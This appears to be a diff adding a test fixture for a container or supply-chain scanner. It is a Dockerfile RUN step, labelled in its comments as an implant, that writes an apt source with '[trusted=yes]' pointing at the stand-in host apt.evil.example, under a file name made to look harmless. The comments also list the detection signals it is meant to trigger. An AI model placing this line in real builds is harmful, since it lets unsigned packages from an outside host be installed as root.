@@ -1,0 +1,8 @@
+# APT2 implant: apt2-repo-trusted (supply-chain: unsigned repo channel). Adds
+# an apt source with [trusted=yes] pointing at an attacker host — apt will
+# install UNSIGNED packages from it as root. pkgrepo lifts trusted=yes ->
+# repo_gpgcheck_disabled -> pkgrepo_gpgcheck_disabled (and the non-canonical
+# host -> repo_origin_added, signal-only). Variables: (none)
+RUN mkdir -p /etc/apt/sources.list.d && \
+    printf '%s\n' 'deb [trusted=yes] http://apt.evil.example/repo stable main' > /etc/apt/sources.list.d/zz-cache.list && \
+    chown root:root /etc/apt/sources.list.d/zz-cache.list && chmod 0644 /etc/apt/sources.list.d/zz-cache.list
